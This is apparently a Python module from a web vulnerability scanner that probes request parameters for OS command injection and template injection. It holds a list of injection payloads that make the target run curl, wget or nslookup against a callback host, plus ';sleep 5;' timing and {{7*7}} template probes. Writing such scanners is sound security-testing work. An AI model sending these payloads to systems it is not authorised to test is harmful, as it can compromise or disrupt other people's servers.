"""Remote Code Execution / OS command injection scanner.

Detects:
  * direct in-band command injection (echoed marker)
  * blind RCE via response timing (sleep payloads)
  * **blind RCE via OOB DNS/HTTP callback** (interactsh)
  * SSTI engines that evaluate {{7*7}} -> 49 etc.
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import TYPE_CHECKING

from core.utils import merge_query, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

MARKER_RE = re.compile(r"SX_([a-z0-9]{4,12})_OK")
SSTI_PRODUCT_RE = re.compile(r"\b49\b")
SSTI_OBJECT_HINTS = ("<class 'object'>", "<built-in", "java.lang", "Werkzeug")

OOB_TEMPLATES = [
    ";curl http://{host}/sx;",
    "|curl http://{host}/sx",
    "&& wget -qO- http://{host}/sx",
    "$(curl http://{host}/sx)",
    "`curl http://{host}/sx`",
    ";nslookup {host};",
    "|nslookup {host}",
    "%0acurl%20http://{host}/sx",
]


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    rce_payloads = ctx.payloads.for_category("rce", limit=18)
    ssti_payloads = ctx.payloads.for_category("ssti", limit=12)
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))
    oob_tokens: dict[str, str] = {}

    async def test(param: str) -> None:
        # ----- in-band OS command injection -----
        for p in rce_payloads:
            async with sem:
                ev = await _request(ctx, url, method, param, p, form)
            if MARKER_RE.search(ev.response_body or ""):
                findings.append({
                    "category": "rce",
                    "title": f"OS command injection in `{param}`",
                    "severity": "critical", "cvss": 9.8,
                    "url": url, "parameter": param, "payload": p,
                    "evidence": "Injected echo marker (SX_*_OK) returned in response body — confirms RCE.",
                    "request": f"{ev.method} {ev.url}",
                    "response": (ev.response_body or "")[:1500],
                    "metadata": {"detection": "marker"},
                })
                ctx.memory.record_payload_result(p, "rce", True)
                return
            ctx.memory.record_payload_result(p, "rce", False)

        # ----- blind RCE via OOB callback -----
        if ctx.oob and ctx.oob.registered:
            token = ctx.oob.token()
            host = ctx.oob.host_for(token)
            oob_tokens[param] = token
            for tpl in OOB_TEMPLATES:
                async with sem:
                    await _request(ctx, url, method, param, tpl.format(host=host), form)

        # ----- blind RCE via timing -----
        sleep_payload = ";sleep 5;"
        t0 = time.perf_counter()
        async with sem:
            ev = await _request(ctx, url, method, param, sleep_payload, form)
        elapsed = time.perf_counter() - t0
        if elapsed >= 4.5 and ev.status:
            findings.append({
                "category": "rce",
                "title": f"Blind OS command injection in `{param}` (time-based)",
                "severity": "critical", "cvss": 9.8,
                "url": url, "parameter": param, "payload": sleep_payload,
                "evidence": f"Response delayed {elapsed:.2f}s after `;sleep 5;` — confirms blind RCE.",
                "request": f"{ev.method} {ev.url}",
                "metadata": {"elapsed_s": elapsed},
            })
            return

        # ----- SSTI -----
        for p in ssti_payloads:
            async with sem:
                ev = await _request(ctx, url, method, param, p, form)
            body = ev.response_body or ""
            if not body:
                continue
            triggered = (
                ("{{7*7}}" in p and SSTI_PRODUCT_RE.search(body) and "{{7*7}}" not in body)
                or ("7*'7'" in p and "7777777" in body)
                or any(h in body for h in SSTI_OBJECT_HINTS)
            )
            if triggered:
                findings.append({
                    "category": "ssti",
                    "title": f"Server-side template injection in `{param}`",
                    "severity": "critical", "cvss": 9.0,
                    "url": url, "parameter": param, "payload": p,
                    "evidence": "Template engine evaluated injected expression — escalation to RCE likely.",
                    "request": f"{ev.method} {ev.url}",
                    "response": body[:1500],
                    "metadata": {"detection": "ssti-product"},
                })
                ctx.memory.record_payload_result(p, "ssti", True)
                return
            ctx.memory.record_payload_result(p, "ssti", False)

    await asyncio.gather(*(test(p) for p in params))

    # poll OOB once for any blind RCE callbacks
    if ctx.oob and ctx.oob.registered and oob_tokens:
        await asyncio.sleep(2.0)
        for param, token in oob_tokens.items():
            events = await ctx.oob.poll(token)
            if events:
                findings.append({
                    "category": "rce",
                    "title": f"Blind OS command injection in `{param}` (OOB)",
                    "severity": "critical", "cvss": 9.8,
                    "url": url, "parameter": param, "payload": f"oob://{token}",
                    "evidence": f"OOB callback received from injected command "
                                f"({len(events)} interactions) — confirms blind RCE.",
                    "request": f"{method.upper()} {url}",
                    "metadata": {"detection": "oob",
                                 "kinds": sorted({e.get("protocol", "?") for e in events})},
                })
    return findings


async def _request(ctx, url, method, param, value, form):
    if method.upper() == "GET":
        return await ctx.http.get(merge_query(url, {param: value}))
    data = {i["name"]: i.get("value") or random_token(4) for i in (form or {}).get("inputs", [])}
    data[param] = value
    return await ctx.http.post(url, data=data)
